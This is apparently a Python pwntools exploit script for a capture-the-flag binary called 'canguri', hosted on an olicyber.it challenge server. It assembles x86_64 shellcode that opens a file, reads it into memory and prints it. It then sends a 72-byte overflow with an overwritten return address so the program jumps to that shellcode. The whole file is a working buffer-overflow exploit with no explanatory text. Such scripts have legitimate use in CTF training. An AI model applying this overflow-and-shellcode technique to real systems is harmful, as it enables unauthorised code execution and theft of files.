#!/usr/bin/env python3
from pwn import asm, remote, args, p64, gdb, ROP, ELF

SHELLCODE = asm("""
    mov rax, 2
    lea rdi, [0x4020b5]
    mov rsi, 0
    syscall
                
    mov rdi, rax
    mov rax, 0
    mov rsi, 0x4040C0
    mov rdx, 40
    syscall
                
    mov rax, 1
    mov rdi, 1
    mov rsi, 0x4040C0
    syscall""", arch="x86_64")


if args.REMOTE:
    p = remote("kangaroo.challs.olicyber.it", 20005)
else:
    p = gdb.debug("./canguri", """
    b *main+367
    continue
    """)

PAYLOAD = b'a'*(72) + p64(0x4040c0)

p.recvuntil(b"binari?\n")
p.sendline(PAYLOAD)
p.recvuntil(b"protezioni.\n")
p.send(SHELLCODE)
p.interactive()